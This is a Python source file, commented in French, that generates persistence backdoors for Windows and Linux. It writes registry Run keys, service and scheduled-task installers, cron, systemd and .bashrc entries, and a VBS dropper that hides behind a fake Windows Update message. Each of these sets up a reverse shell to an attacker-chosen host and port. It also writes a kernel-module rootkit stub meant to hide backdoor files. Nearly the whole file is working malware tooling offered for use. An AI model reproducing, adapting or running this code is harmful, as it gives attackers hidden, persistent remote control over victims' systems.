#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚪 BACKDOOR CREATOR - Module de création de backdoors avancées
Persistent Access + Rootkits + Custom Backdoors
"""

import os
import subprocess
import json
import base64
import random
import string
from datetime import datetime

class BackdoorCreator:
    def __init__(self):
        self.created_backdoors = []
        self.backdoor_templates = {
            'windows': {
                'registry': 'windows_registry_backdoor',
                'service': 'windows_service_backdoor',
                'startup': 'windows_startup_backdoor'
            },
            'linux': {
                'cron': 'linux_cron_backdoor',
                'service': 'linux_service_backdoor',
                'rc': 'linux_rc_backdoor'
            }
        }
        
    def create_windows_registry_backdoor(self, lhost, lport, payload_file):
        """Crée un backdoor Windows via registre"""
        print(f"🚪 Création backdoor registre Windows")
        
        try:
            backdoor_file = f"backdoors/windows_registry_{lport}.reg"
            os.makedirs('backdoors', exist_ok=True)
            
            # Script de backdoor registre
            registry_backdoor = f"""Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"SystemUpdate"="{payload_file}"

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
"WindowsService"="{payload_file}"
"""
            
            with open(backdoor_file, 'w') as f:
                f.write(registry_backdoor)
                
            backdoor_info = {
                'type': 'windows_registry',
                'lhost': lhost,
                'lport': lport,
                'payload_file': payload_file,
                'backdoor_file': backdoor_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Backdoor registre créé: {backdoor_file}")
            return backdoor_file
            
        except Exception as e:
            print(f"❌ Erreur backdoor registre: {e}")
            return None
            
    def create_windows_service_backdoor(self, service_name, payload_file):
        """Crée un service Windows backdoor"""
        print(f"🚪 Création service Windows backdoor")
        
        try:
            backdoor_file = f"backdoors/windows_service_{service_name}.bat"
            os.makedirs('backdoors', exist_ok=True)
            
            # Script de création de service
            service_backdoor = f"""@echo off
sc create "{service_name}" binPath= "{payload_file}" start= auto
sc start "{service_name}"
sc config "{service_name}" start= auto
"""
            
            with open(backdoor_file, 'w') as f:
                f.write(service_backdoor)
                
            backdoor_info = {
                'type': 'windows_service',
                'service_name': service_name,
                'payload_file': payload_file,
                'backdoor_file': backdoor_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Service backdoor créé: {backdoor_file}")
            return backdoor_file
            
        except Exception as e:
            print(f"❌ Erreur service backdoor: {e}")
            return None
            
    def create_linux_cron_backdoor(self, lhost, lport):
        """Crée un backdoor Linux via cron"""
        print(f"🚪 Création backdoor cron Linux")
        
        try:
            backdoor_file = f"backdoors/linux_cron_{lport}.sh"
            os.makedirs('backdoors', exist_ok=True)
            
            # Script de backdoor cron
            cron_backdoor = f"""#!/bin/bash
# Backdoor Linux via cron

# Créer le payload Python
cat > /tmp/systemd.py << 'EOF'
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
EOF

# Ajouter au crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /tmp/systemd.py") | crontab -

# Rendre exécutable
chmod +x /tmp/systemd.py

echo "Backdoor installé via cron"
"""
            
            with open(backdoor_file, 'w') as f:
                f.write(cron_backdoor)
                
            backdoor_info = {
                'type': 'linux_cron',
                'lhost': lhost,
                'lport': lport,
                'backdoor_file': backdoor_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Backdoor cron créé: {backdoor_file}")
            return backdoor_file
            
        except Exception as e:
            print(f"❌ Erreur backdoor cron: {e}")
            return None
            
    def create_linux_service_backdoor(self, service_name, lhost, lport):
        """Crée un service Linux backdoor"""
        print(f"🚪 Création service Linux backdoor")
        
        try:
            service_file = f"backdoors/linux_service_{service_name}.service"
            install_script = f"backdoors/install_{service_name}.sh"
            os.makedirs('backdoors', exist_ok=True)
            
            # Fichier de service systemd
            service_content = f"""[Unit]
Description={service_name} Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c '
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
                
            # Script d'installation
            install_content = f"""#!/bin/bash
# Installation du service backdoor

# Copier le fichier de service
cp {service_file} /etc/systemd/system/

# Recharger systemd
systemctl daemon-reload

# Activer et démarrer le service
systemctl enable {service_name}
systemctl start {service_name}

echo "Service backdoor installé: {service_name}"
"""
            
            with open(install_script, 'w') as f:
                f.write(install_content)
                
            os.chmod(install_script, 0o755)
            
            backdoor_info = {
                'type': 'linux_service',
                'service_name': service_name,
                'lhost': lhost,
                'lport': lport,
                'service_file': service_file,
                'install_script': install_script,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Service Linux backdoor créé: {service_file}")
            return service_file
            
        except Exception as e:
            print(f"❌ Erreur service Linux: {e}")
            return None
            
    def create_persistent_backdoor(self, platform, lhost, lport):
        """Crée un backdoor persistant"""
        print(f"🚪 Création backdoor persistant {platform}")
        
        try:
            if platform == 'windows':
                return self.create_windows_persistent_backdoor(lhost, lport)
            elif platform == 'linux':
                return self.create_linux_persistent_backdoor(lhost, lport)
            else:
                print(f"❌ Plateforme non supportée: {platform}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur backdoor persistant: {e}")
            return None
            
    def create_windows_persistent_backdoor(self, lhost, lport):
        """Crée un backdoor Windows persistant"""
        try:
            backdoor_file = f"backdoors/windows_persistent_{lport}.vbs"
            os.makedirs('backdoors', exist_ok=True)
            
            # Backdoor VBS persistant
            vbs_backdoor = f"""Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Créer le payload PowerShell
payload = "powershell -WindowStyle Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }}; $client.Close()\""

' Ajouter au registre pour persistance
objShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate", payload, "REG_SZ"

' Créer une tâche planifiée
objShell.Run "schtasks /create /tn SystemUpdate /tr """ & payload & """ /sc onlogon /ru System", 0, True

' Exécuter immédiatement
objShell.Run payload, 0, False

MsgBox "System Update Completed", 64, "Windows Update"
"""
            
            with open(backdoor_file, 'w') as f:
                f.write(vbs_backdoor)
                
            backdoor_info = {
                'type': 'windows_persistent',
                'lhost': lhost,
                'lport': lport,
                'backdoor_file': backdoor_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Backdoor Windows persistant créé: {backdoor_file}")
            return backdoor_file
            
        except Exception as e:
            print(f"❌ Erreur backdoor Windows: {e}")
            return None
            
    def create_linux_persistent_backdoor(self, lhost, lport):
        """Crée un backdoor Linux persistant"""
        try:
            backdoor_file = f"backdoors/linux_persistent_{lport}.sh"
            os.makedirs('backdoors', exist_ok=True)
            
            # Backdoor bash persistant
            bash_backdoor = f"""#!/bin/bash
# Backdoor Linux persistant

# Créer le payload Python
cat > /tmp/.systemd << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import os
import time

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
            
        s.close()
    except:
        time.sleep(30)
        continue
EOF

# Rendre exécutable
chmod +x /tmp/.systemd

# Ajouter au crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd") | crontab -

# Ajouter au .bashrc
echo "nohup /tmp/.systemd > /dev/null 2>&1 &" >> ~/.bashrc

# Démarrer immédiatement
nohup /tmp/.systemd > /dev/null 2>&1 &

echo "System update completed"
"""
            
            with open(backdoor_file, 'w') as f:
                f.write(bash_backdoor)
                
            os.chmod(backdoor_file, 0o755)
            
            backdoor_info = {
                'type': 'linux_persistent',
                'lhost': lhost,
                'lport': lport,
                'backdoor_file': backdoor_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Backdoor Linux persistant créé: {backdoor_file}")
            return backdoor_file
            
        except Exception as e:
            print(f"❌ Erreur backdoor Linux: {e}")
            return None
            
    def create_rootkit_backdoor(self, platform):
        """Crée un backdoor rootkit"""
        print(f"🚪 Création rootkit backdoor {platform}")
        
        try:
            if platform == 'linux':
                return self.create_linux_rootkit()
            else:
                print(f"❌ Rootkit non supporté pour: {platform}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur rootkit: {e}")
            return None
            
    def create_linux_rootkit(self):
        """Crée un rootkit Linux basique"""
        try:
            rootkit_file = f"backdoors/linux_rootkit.c"
            os.makedirs('backdoors', exist_ok=True)
            
            # Rootkit C basique
            rootkit_code = """#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System");
MODULE_DESCRIPTION("Kernel Module");

// Hook pour masquer les processus
static int (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = orig_getdents64(regs);
    
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct linux_dirent64 *current_dir, *dirent_ker = NULL;
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;
    
    if (copy_from_user(dirent_ker, dirent, ret))
        goto done;
    
    while (off < ret) {
        dir = (void *)dirent_ker + off;
        
        // Masquer les processus backdoor
        if (strstr(dir->d_name, "backdoor") || strstr(dir->d_name, "rootkit")) {
            if ( dir == dirent_ker ) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret))
        goto done;
    
done:
    kfree(dirent_ker);
    return ret;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "System module loaded\\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "System module unloaded\\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
"""
            
            with open(rootkit_file, 'w') as f:
                f.write(rootkit_code)
                
            # Makefile pour compiler
            makefile_content = """obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
"""
            
            with open("backdoors/Makefile", 'w') as f:
                f.write(makefile_content)
                
            backdoor_info = {
                'type': 'linux_rootkit',
                'rootkit_file': rootkit_file,
                'makefile': 'backdoors/Makefile',
                'timestamp': datetime.now().isoformat()
            }
            
            self.created_backdoors.append(backdoor_info)
            print(f"✅ Rootkit Linux créé: {rootkit_file}")
            return rootkit_file
            
        except Exception as e:
            print(f"❌ Erreur rootkit: {e}")
            return None
            
    def get_created_backdoors(self):
        """Retourne les backdoors créés"""
        return self.created_backdoors
        
    def export_backdoors(self, filename):
        """Exporte les informations des backdoors"""
        with open(filename, 'w') as f:
            json.dump(self.created_backdoors, f, indent=2)
            
        print(f"📤 Backdoors exportés: {filename}")
        
    def list_backdoor_types(self):
        """Liste les types de backdoors disponibles"""
        return {
            'windows': ['registry', 'service', 'persistent'],
            'linux': ['cron', 'service', 'persistent', 'rootkit']
        } 